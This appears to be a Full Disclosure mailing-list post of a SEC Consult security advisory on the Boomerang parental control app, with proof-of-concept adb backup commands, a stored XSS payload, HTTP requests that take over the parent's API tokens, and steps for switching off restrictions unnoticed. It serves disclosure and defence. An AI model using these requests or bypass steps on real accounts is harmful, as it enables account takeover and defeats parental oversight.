@@ -1,0 +1,325 @@
+
+Date: Wed, 28 Jun 2023 07:29:21 +0000
+From: "SEC Consult Vulnerability Lab,
+ Research via Fulldisclosure" <fulldisclosure@...lists.org>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] SEC Consult SA-20230628-0 :: Stored XSS & Privilege Escalation
+ in Boomerang Parental Control App
+
+SEC Consult Vulnerability Lab Security Advisory < 20230628-0 >
+=======================================================================
+               title: Stored XSS & Privilege Escalation
+             product: Boomerang Parental Control App
+  vulnerable version: <13.83
+       fixed version: >=13.83 (only issue 1), rest not fixed
+          CVE number: CVE-2023-36620, CVE-2023-36621
+              impact: High
+            homepage: https://nationaledtech.com
+               found: 2022-09-29
+                  by: Fabian Densborn (Office Vienna)
+                      Bernhard Gründling (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Eviden business
+                      Europe | Asia
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"National Education Technologies Inc. is a manufacturer of mobile
+applications. Their portfolio ranges from parental control apps, to
+safe browsing apps, to digital wellbeing apps."
+
+Source: https://nationaledtech.com
+
+
+Business recommendation:
+------------------------
+The vendor only provides an update for one of the identified security issues,
+but it effectively reduces the risk of some of the other vulnerabilities, which
+are currently not fixed yet. The vendor could not provide a timeline when the
+rest of the issues will be patched.
+If possible, limit the possibility to boot into Android safe mode. Otherwise
+children are always able to bypass any restrictions.
+
+An in-depth security analysis performed by security professionals is
+highly advised, to identify and resolve potential further critical security
+issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) ADB Backup allowed (CVE-2023-36620)
+The app is missing the android:allowBackup="false" attribute in the
+manifest which allows the user to backup the internal memory of the
+app to a PC. This gives the user access to the device (in case ADB is enabled)
+and API token which are used to authenticate requests to the API.
+
+2) Stored XSS
+The customizable name of the child's device can be used to trigger a XSS
+payload in the parent web dashboard. Children might be able to attack
+their parents' account.
+
+3) Trigger parent control functions from child device (Privilege Escalation)
+A device token in the form of a UUID is used as a session token for the parent
+and the child device. The parent device token is leaked on an endpoint which
+is accessible by the child, which is equivalent to leaking the session token.
+This token can then be used to authenticate requests to the API and get the same
+access rights as the parent. This would allow a child to bypass restrictions
+and access device settings.
+
+4) Disable Child App Restriction without Parent's notice (CVE-2023-36621)
+The child can remove all restrictions temporarily or uninstall the application
+without the parents noticing.
+
+
+Proof of concept:
+-----------------
+1) ADB Backup allowed (CVE-2023-36620)
+The internals of the app can be backed up to a PC by connecting the device
+and running the following commands. As a prerequisite, the ADB feature
+must be enabled or being used via recovery. Children could bypass any Android
+setting restrictions via vulnerability 3).
+
+--------------------------------------------------------------------------------
+adb backup -apk com.nationaledtech.Boomerang
+dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress | tar xf -
+--------------------------------------------------------------------------------
+
+The internal data contains the device and API token which are used to
+communicate with the API.
+
+
+2) Stored XSS
+As the internal memory including the device and API token is backup-able (see 1),
+it is possible to construct arbitrary requests to the API in the name
+of the child. The following payload can be used to change the device name
+and trigger an alert box in the dashboard of the parent:
+
+--------------------------------------------------------------------------------
+POST /services/DeviceService.svc/RenameDevice HTTP/1.1
+Accept: application/json
+Content-Type: application/json;charset=UTF-8
+Content-Length: 1470
+Host: app.useboomerang.com
+
+{
+     "DeviceToken": <child-device-token>,
+     "ApiToken": <child-api-token>,
+     "DeviceTitle":"\"\/><img src=\"x\" onerror=\"alert(1)\"\/>",
+     "TargetDeviceToken": <child-device-token>
+}
+--------------------------------------------------------------------------------
+
+
+3) Access parent control functions from child device (Privilege Escalation)
+When visiting the Family Messenger Tab within the application on the device, a GET
+request to API endpoint `/services/FamilyService.svc/GetAllFamilyDevices` will be
+sent and the response contains all DeviceTokens associated with the account
+(including the ones of parent devices).
+
+To be able to query the `/services/FamilyService.svc/GetAllFamilyDevices`
+endpoint an attacker first needs to backup their device and get access to their
+own device and API token. Then an attacker is able to create their own request
+querying the device token of the parent.
+
+--------------------------------------------------------------------------------
+POST /services/FamilyService.svc/GetAllFamilyDevices HTTP/1.1
+Accept: application/json
+Content-Type: application/json;charset=UTF-8
+Content-Length: 54
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; Pixel 4a Build/RQ2A.210305.006)
+Host: app.useboomerang.com
+Connection: close
+Accept-Encoding: gzip, deflate
+
+{"DeviceToken":"<child-token>"}
+--------------------------------------------------------------------------------
+
+Response:
+--------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: application/json; charset=utf-8
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+Connection: close
+Content-Length: 450
+
+{
+	"content":null,
+	"isSuccessful":true,
+	"Devices":[
+		{
+			"DeviceToken":"[parent-token]",
+			[...]
+		}
+	]
+}
+--------------------------------------------------------------------------------
+
+With the DeviceToken of the parent, the API token can be retrieved from the
+`/services/DeviceService.svc/UpdateStatus` endpoint:
+
+--------------------------------------------------------------------------------
+POST /services/DeviceService.svc/UpdateStatus HTTP/1.1
+Host: app.useboomerang.com
+Accept: application/json
+Content-Type: application/json
+User-Agent: Boomerang/234 CFNetwork/1240.0.4 Darwin/20.5.0
+Accept-Language: en-us
+Content-Length: 55
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+{"DeviceToken": <parent-token>,}
+--------------------------------------------------------------------------------
+
+As the device token combined with the API token are used to authenticate requests
+to the API, the child now has the same access rights as the parent.
+
+
+4) Disable Child App Restriction without Parent's notice (CVE-2023-36621)
+The child can disable the restrictions of the application without the parents
+noticing. For this, the following steps are necessary:
+a) Turn off Internet connectivity on the child device or block access to the
+    API server (e.g. on the router).
+b) Reboot into Android Safe Mode.
+c) Disable Device Admin, "Display over other apps", Usage Access, Accessibility
+    Permissions for the app in Android settings.
+d) After rebooting in to normal mode, the child device can be used without
+    restrictions. For example, previously locked apps can now be used. The parent's
+    application will show that Protection is still on and the last check-in time.
+    Internet must stay off on the child device during this.
+e) After usage of the restricted apps is finished, the mentioned permissions are
+    turned back on.
+f) The device is restarted to clear any cached HTTP requests of the app that might
+    inform the parent.
+g) Internet is re-enabled. The parent's device will not see an indication of these
+    activities on their device.
+
+Alternatively, the Boomerang app can also be uninstalled after disabling the Device
+Admin permission in step 3. Internet can then be turned on as well on the child's
+device without any notification to the parent. The only way for the parent to notice
+this would be to manually check the last check-in time.
+
+The "Safe Mode Bypass" cannot be exploited on Samsung KNOX capable devices, as
+special restrictions can be set in order to disable booting into safe mode.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested and downloaded from the Google Play store,
+which was the most recent version available at the time of the initial test:
+* Android app version 13.53
+
+Later on, version 13.61 (2022-10-25) and 13.68 (2022-12-13) have been verified to be
+vulnerable as well.
+
+
+Vendor contact timeline:
+------------------------
+2022-11-23: Contacting vendor through support@...boomerang.com and
+             support@...ionaledtech.com
+2022-11-23: Response from vendor: "We got your email but can't
+             understand it - maybe it was sent by accident? How can we help?"
+2022-11-24: Explaining that our email was no accident and that we want
+             to send our security advisory over encrypted channels to the vendor .
+             No response.
+2022-12-05: Notifying vendor again that we found critical security
+             issues and where to send the advisory to.
+             No response.
+2022-12-15: Still no response, informing vendor again about the planned
+             release date of 12th January, informing them that a blog post
+             is planned with an overview about security issues in
+             parental control apps for next week.
+2022-12-15: Vendor response: "Hi. I can't understand this attachment. What
+             is the issue?"
+2022-12-16: Explaining "responsible disclosure" to the vendor again, asking
+             where to send the advisory and that a blog post is planned, as
+             well as the advisory release for 12th January.
+2022-12-20: Published blog post (https://r.sec-consult.com/parents), asked
+             vendor again where to send the security advisory.
+2022-12-21: Vendor reply, please send advisory via email. Seems like all
+             previous answers from the vendor were not properly received
+             (mail server problem).
+2022-12-21: Advisory was sent to vendor.
+2023-01-11: Advisory was sent directly to mail addresses of vendor, not via
+             support mail address. Vendor confirms receipt now.
+2023-02-14: Asking for a status update; no response.
+2023-02-28: Asking for a status update again, vendor answers that "some issues"
+             have been fixed but they are still checking what is pending.
+2023-03-02: Vendor responds that local backup vulnerability will be fixed soon,
+             backend changes are reviewed, no timeline.
+2023-05-09: Asking for a status update, informing vendor about security advisory
+             release plan for May.
+2023-05-19: Vendor: Only local backup vulnerability is fixed, backend parts
+             are on the roadmap.
+2023-05-22: Asking about a timeline/estimation for this roadmap to fix the backend
+             vulnerabilities and which version includes the fix for issue 1).
+2023-05-30: Vendor: latest version on Google Play v13.83 has ADB backup fix
+2023-05-31: Sending current advisory version to vendor, setting preliminary
+             release date to end of June, asking for timeline again, asking whether
+             there are any issues in incorporating the fixes for the other
+             vulnerabilities.
+             No response.
+2023-06-28: Release of security advisory.
+
+
+Solution:
+---------
+According to the vendor, only issue 1) has been fixed in version 13.83, the other security
+issues are still not fixed yet. Please contact the vendor for further information
+regarding their timeline.
+
+
+Workaround:
+-----------
+Be aware that children might be able to bypass any imposed restrictions.
+If possible, disable booting into Android Safe Mode which works on Samsung Knox-
+enabled smart phones.
+
+
+Advisory URL:
+-------------
+https://sec-consult.com/vulnerability-lab/
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+An integrated part of SEC Consult, an Eviden business
+Europe | Asia
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
+Eviden business. It ensures the continued knowledge gain of SEC Consult in the
+field of network and application security to stay ahead of the attacker. The
+SEC Consult Vulnerability Lab supports high-quality penetration testing and
+the evaluation of new offensive and defensive technologies for our customers.
+Hence our customers obtain the most current information about vulnerabilities
+and valid recommendation about the risk profile of new technologies.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/career/
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/contact/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: security-research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF F. Densborn, B. Gründling / @2023
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
